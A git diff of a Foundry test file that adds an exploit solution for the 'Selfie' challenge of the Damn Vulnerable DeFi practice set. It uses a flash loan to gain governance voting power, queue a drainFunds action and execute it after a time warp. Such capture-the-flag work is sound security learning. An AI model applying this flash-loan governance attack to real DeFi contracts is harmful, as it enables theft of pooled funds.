@@ -8,6 +8,8 @@ import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableToke
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
+import {Receiver} from "./Receiver.sol";
+
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
     uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
@@ -43,9 +45,22 @@ contract Selfie is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    function testSelfieExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        // 1. borrow flashloan via receiver contract
+        Receiver receiver = new Receiver(
+            address(dvtSnapshot),
+            address(simpleGovernance),
+            address(selfiePool)
+        );
+        // 2. queue governance action -> call drainfunds & snapshot token
+        receiver.flashLoan(1_500_000e18 - 1);
+        // 3. execute action
+        vm.warp(block.timestamp + 3 days);
+        simpleGovernance.executeAction(1);
 
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
